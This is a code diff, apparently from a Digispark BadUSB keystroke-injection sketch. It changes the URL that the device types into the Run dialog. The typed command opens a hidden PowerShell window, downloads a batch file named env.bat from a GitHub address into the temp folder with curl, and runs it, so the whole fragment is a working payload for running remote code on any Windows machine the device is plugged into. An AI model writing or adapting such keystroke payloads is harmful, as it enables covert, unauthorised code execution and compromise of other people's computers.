@@ -15,7 +15,7 @@ void loop() {
   
     DigiKeyboard.sendKeyStroke(KEY_R , MOD_GUI_LEFT);
     DigiKeyboard.delay(500);
-    DigiKeyboard.print("powershell -windowstyle hidden cmd.exe /c \"curl https://gist.githubusercontent.com/r4mdev/15e316404185175296360e451e6a6812/raw/2179cf1b9c1cddcb831a032413a836b0f5b00b66/env.bat -o %tmp%\\env.bat;%tmp%\\env.bat\"");
+    DigiKeyboard.print("powershell -windowstyle hidden cmd.exe /c \"curl --ssl-no-revoke https://raw.githubusercontent.com/r4mdev/shotter/main/env.bat -o %tmp%\\env.bat;%tmp%\\env.bat\"");
     DigiKeyboard.delay(1500);
     DigiKeyboard.sendKeyStroke(KEY_ENTER); 
     DigiKeyboard.delay(7000);
